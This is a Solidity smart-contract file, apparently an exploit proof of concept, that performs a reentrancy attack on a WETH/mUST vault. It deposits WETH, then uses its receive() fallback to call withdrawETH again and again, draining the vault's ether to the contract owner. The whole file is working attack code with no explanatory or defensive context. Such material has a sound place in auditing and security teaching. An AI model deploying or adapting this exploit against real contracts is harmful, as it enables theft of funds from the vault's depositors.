pragma solidity 0.8.16;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IVault {
	function deposit(uint256 amount) external;
	function withdrawETH(uint256 amount) external;
}

contract ReenterancyAttack is Ownable {

	uint256 count = 0;
	uint256 part = 0;
	address vault;
	address WETH;
	address mUST;

	constructor(address _vault, address _WETH, address _mUST) {
		vault = _vault;
		WETH = _WETH;
		mUST = _mUST;
	}

	function attack(uint256 amount) public onlyOwner {
		IERC20(WETH).transferFrom(msg.sender, address(this), amount);
		IERC20(WETH).approve(vault, amount);
		IVault(vault).deposit(amount);
		part = IERC20(mUST).balanceOf(address(this)) / 4;
		IERC20(mUST).approve(vault, IERC20(mUST).balanceOf(address(this)));
		IVault(vault).withdrawETH(part);
		payable(owner()).call{value: address(this).balance}("");
	}

	receive() external payable {
		count+=1;
		if(count < 3) {
			IVault(vault).withdrawETH(part);
		} 
		if (count == 3) {
			IVault(vault).withdrawETH(IERC20(mUST).balanceOf(address(this)));
		}
	}
}